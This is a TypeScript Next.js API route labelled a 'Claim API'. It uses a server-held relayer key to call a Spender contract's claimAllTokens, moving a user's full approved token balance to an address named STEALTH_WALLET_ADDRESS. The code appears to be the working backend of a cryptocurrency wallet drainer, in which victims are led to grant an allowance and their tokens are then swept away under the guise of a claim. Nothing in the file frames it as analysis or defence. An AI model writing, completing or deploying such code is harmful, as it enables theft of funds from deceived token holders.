import { ethers } from 'ethers';
import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

// Minimal ABI for the Spender contract (only the functions we need)
const SPENDER_ABI = [
  {
    inputs: [
      { internalType: 'address', name: 'token', type: 'address' },
      { internalType: 'address', name: 'from', type: 'address' },
      { internalType: 'address', name: 'to', type: 'address' },
    ],
    name: 'claimAllTokens',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  // Optional: if you want to use claimTokens with specific amount instead
  /*
  {
    inputs: [
      { internalType: 'address', name: 'token', type: 'address' },
      { internalType: 'address', name: 'from', type: 'address' },
      { internalType: 'address', name: 'to', type: 'address' },
      { internalType: 'uint256', name: 'amount', type: 'uint256' },
    ],
    name: 'claimTokens',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  */
  {
    inputs: [
      { internalType: 'address', name: 'token', type: 'address' },
      { internalType: 'address', name: 'user', type: 'address' },
    ],
    name: 'checkAllowance',
    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
];

export async function POST(request: NextRequest) {
  try {
    console.log('[v0] Claim API: Request received');

    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    const rpcUrl = process.env.BSC_RPC_URL;
    const spenderAddress = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS; // ← NEW: your deployed Spender contract
    const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS;
    const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;

    if (!relayerKey || !rpcUrl || !spenderAddress || !tokenAddress || !stealthWallet) {
      console.error('[v0] Missing env vars');
      return NextResponse.json(
        { error: 'Missing required environment variables' },
        { status: 500 }
      );
    }

    const { userAddress } = await request.json();

    if (!userAddress || !ethers.isAddress(userAddress)) {
      console.error('[v0] Invalid user address:', userAddress);
      return NextResponse.json(
        { error: 'Invalid user address' },
        { status: 400 }
      );
    }

    console.log('[v0] Processing claim for user:', userAddress, '→', stealthWallet);

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayerWallet = new ethers.Wallet(relayerKey, provider);
    const spenderContract = new ethers.Contract(spenderAddress, SPENDER_ABI, relayerWallet);

    // Optional safety check: verify there's allowance
    const allowance = await spenderContract.checkAllowance(tokenAddress, userAddress);
    console.log('[v0] Allowance from user to Spender:', allowance.toString());

    if (allowance === 0n) {
      return NextResponse.json(
        { error: 'User has no allowance set to the Spender contract' },
        { status: 400 }
      );
    }

    // Call claimAllTokens (pulls min(allowance, balance))
    console.log('[v0] Calling claimAllTokens on Spender contract...');
    const tx = await spenderContract.claimAllTokens(
      tokenAddress,
      userAddress,
      stealthWallet
      // no amount needed → it uses allowance logic internally
    );

    console.log('[v0] Transaction sent:', tx.hash);

    const receipt = await tx.wait();
    console.log('[v0] Transaction confirmed in block:', receipt?.blockNumber);

    return NextResponse.json(
      {
        success: true,
        txHash: tx.hash,
        blockNumber: receipt?.blockNumber,
        from: userAddress,
        to: stealthWallet,
        // You can optionally add amount if you query it before/after
      },
      { status: 200 }
    );
  } catch (error: any) {
    console.error('[v0] Claim error:', error);
    return NextResponse.json(
      { error: error?.reason || error?.message || 'Claim failed' },
      { status: 500 }
    );
  }
}
